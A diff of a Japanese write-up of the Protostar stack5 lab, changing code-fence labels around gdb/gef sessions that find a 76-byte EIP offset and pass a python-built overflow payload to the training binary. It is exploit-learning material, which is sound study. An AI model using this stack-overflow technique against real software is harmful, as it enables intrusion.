@@ -67,7 +67,7 @@ End of assembler dump.
 breakpointを`gets`呼び出しの直後に貼って、文字列パターンを生成する
 このパターンは、のちにオフセットの長さを測るのに用いる
 
-```gdb
+```shell
 gef➤  b *main+21
 Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
 gef➤  pattern create 128
@@ -92,7 +92,7 @@ $eip   : 0x61616174 ("taaa"?)
 
 次にこの*"taaa"*の文字列が`$eax`からどれほどアドレスが離れているかを調べる
 
-```sh
+```shell
 gef➤  pattern search 0x61616174
 [+] Searching '0x61616174'
 [+] Found at offset 76 (little-endian search) likely
@@ -101,7 +101,7 @@ gef➤  pattern search 0x61616174
 
 このバイナリはリトルエンディアンである
 
-```sh
+```shell
 gef➤  elf-info 
 Magic                 : 7f 45 4c 46
 Class                 : 0x1 - 32-bit
@@ -126,7 +126,7 @@ Entry point           : 0x08048310
 先ほどとは入力文字列を変えて実行してみる
 オフセットが **76** なので、
 
-```sh
+```shell
 gef➤  r <<< $(python -c 'print "A"*76 + "\xef\xbe\xed\x1c" + "B"*128')
 Starting program: /home/mkm/Develop/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xed\x1c" + "B"*128')
 
